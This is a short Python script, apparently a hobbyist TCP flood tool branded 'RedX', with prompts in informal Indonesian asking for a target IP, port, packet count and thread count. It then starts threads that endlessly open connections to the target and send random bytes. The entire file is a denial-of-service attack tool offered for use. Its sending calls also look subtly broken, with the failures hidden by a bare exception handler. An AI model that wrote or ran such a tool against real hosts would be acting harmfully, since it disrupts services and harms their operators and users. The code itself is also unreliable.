#python3/tcpflood
#code by XalbadorX
import random
import socket
import threading
import os,sys
os.system("clear")
print("\033[93m")
print('''\033[93m Tools By RedX
██████╗░███████╗██████ ╗██╗░░██╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
██████╔╝█████╗░░██║░░██║░╚███╔╝
██╔══██╗██╔══╝░░██║░░██║░██╔██╗
██║░░██║███████╗██████╔╝██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝
''')
ip_bos = str(input("Masukin Ipnya Woy : "))
port_bos = int(input("Masukin Portnya Woy : "))
paket_bos = int(input("Mau Berapa Packetnya : "))
threads_bos = int(input("Mau Berapa Lama | Threads : "))

os.system("clear")
def bos():
    boss = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            s.connect((ip_bos,port_bos))
            s.sendto(boss)
            for y in range(paket_bos):
                s.sendto(boss)
            print("\033[95m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
        except:
            s.close()
            print("\033[93m[*TOK*TOK*] PERMISI PAKET DATENG")
            
for y in range(threads_bos):
    wb = threading.Thread(target=bos)
    wb.start()  
